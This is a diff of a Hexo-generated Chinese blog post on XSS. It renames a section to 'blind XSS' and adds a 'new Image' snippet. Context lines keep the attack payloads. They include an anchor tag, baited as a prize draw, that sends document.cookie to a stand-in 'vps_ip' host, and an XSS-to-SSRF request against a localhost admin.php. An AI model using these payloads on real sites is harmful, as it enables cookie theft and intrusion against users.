@@ -94,17 +94,17 @@
 
 
 
-<meta name="description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  向VPS发送数据no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0">
+<meta name="description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  盲打no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0.0.1才能">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss">
 <meta property="og:url" content="http://yoursite.com/2019/09/21/xss/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  向VPS发送数据no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0">
+<meta property="og:description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  盲打no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0.0.1才能">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-09-22T00:16:17.825Z">
+<meta property="og:updated_time" content="2019-10-16T14:20:16.859Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss">
-<meta name="twitter:description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  向VPS发送数据no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0">
+<meta name="twitter:description" content="需要掌握的基础知识点 document.cookie  用户cookie navigator.userAgent  识别用户浏览器 btoa为js中的base64编码，atob为解码 1234btoa(&apos;adsda&apos;)&quot;YWRzZGE=&quot;atob(&quot;YWRzZGE=&quot;)&quot;adsda&quot;  盲打no.1 可以获取想要的数据 伪造cookie等等 no.2 如果后台有限制ip为127.0.0.1才能">
 
 
 
@@ -337,7 +337,7 @@
 <p>btoa为js中的base64编码，atob为解码</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">btoa(<span class="string">'adsda'</span>)</span><br><span class="line"><span class="string">"YWRzZGE="</span></span><br><span class="line">atob(<span class="string">"YWRzZGE="</span>)</span><br><span class="line"><span class="string">"adsda"</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="向VPS发送数据"><a href="#向VPS发送数据" class="headerlink" title="向VPS发送数据"></a>向VPS发送数据</h2><p><strong>no.1</strong> 可以获取想要的数据 伪造cookie等等</p>
+<h2 id="盲打"><a href="#盲打" class="headerlink" title="盲打"></a>盲打</h2><p><strong>no.1</strong> 可以获取想要的数据 伪造cookie等等</p>
 <p><strong>no.2</strong> 如果后台有限制ip为127.0.0.1才能访问的文件，可以用xss打一个ssrf  比如这样</p>
 <p>document.createElement(“img”)</p>
 <p>img.src=”<a href="http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;" target="_blank" rel="noopener">http://127.0.0.1/admin.php?file=shell&amp;date=phpinfo&quot;</a></p>
@@ -345,6 +345,9 @@
 <p>img.src=”<a href="http://vps_ip:9999/给标签的src属性赋值" target="_blank" rel="noopener">http://vps_ip:9999/给标签的src属性赋值</a></p>
 <p>创建一个标签，然后给这个标签的属性赋值，有两种方式</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var iframe = document.createElement('iframe'); </span><br><span class="line">iframe.src=xss;  </span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line"></span><br><span class="line">var iframe = document.createElement('iframe');</span><br><span class="line">iframe.setAttribute('src',xss);</span><br><span class="line">document.body.appendChild(iframe);</span><br></pre></td></tr></table></figure>
+
+<p>new Image 等效于 document.creatElement(“img”)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var myImage = new Image(100, 200);</span><br><span class="line">myImage.src = &apos;picture.jpg&apos;;</span><br><span class="line">document.body.appendChild(myImage);</span><br></pre></td></tr></table></figure>
 
 <h4 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a>&lt;a&gt;标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://vps_ip:9999/a?cookie="</span>+<span class="attr">document.cookie</span>&gt;</span>点击抽奖\<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -481,7 +484,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-count">32</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -520,7 +523,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#向VPS发送数据"><span class="nav-number">1.</span> <span class="nav-text">向VPS发送数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#创建标签"><span class="nav-number">1.0.1.</span> <span class="nav-text">创建标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-a-gt-标签"><span class="nav-number">1.0.2.</span> <span class="nav-text">&lt;a&gt;标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-img-gt-标签"><span class="nav-number">1.0.3.</span> <span class="nav-text">&lt;img&gt;标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#window-location"><span class="nav-number">1.0.4.</span> <span class="nav-text">window.location</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iframe"><span class="nav-number">1.0.5.</span> <span class="nav-text">iframe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写个shell试试"><span class="nav-number">1.1.</span> <span class="nav-text">写个shell试试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#img标签"><span class="nav-number">1.1.1.</span> <span class="nav-text">img标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用iframe标签试试"><span class="nav-number">1.1.2.</span> <span class="nav-text">用iframe标签试试</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#盲打"><span class="nav-number">1.</span> <span class="nav-text">盲打</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#创建标签"><span class="nav-number">1.0.1.</span> <span class="nav-text">创建标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-a-gt-标签"><span class="nav-number">1.0.2.</span> <span class="nav-text">&lt;a&gt;标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-img-gt-标签"><span class="nav-number">1.0.3.</span> <span class="nav-text">&lt;img&gt;标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#window-location"><span class="nav-number">1.0.4.</span> <span class="nav-text">window.location</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iframe"><span class="nav-number">1.0.5.</span> <span class="nav-text">iframe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#写个shell试试"><span class="nav-number">1.1.</span> <span class="nav-text">写个shell试试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#img标签"><span class="nav-number">1.1.1.</span> <span class="nav-text">img标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#用iframe标签试试"><span class="nav-number">1.1.2.</span> <span class="nav-text">用iframe标签试试</span></a></li></ol></li></ol></div>
             
 
           </div>
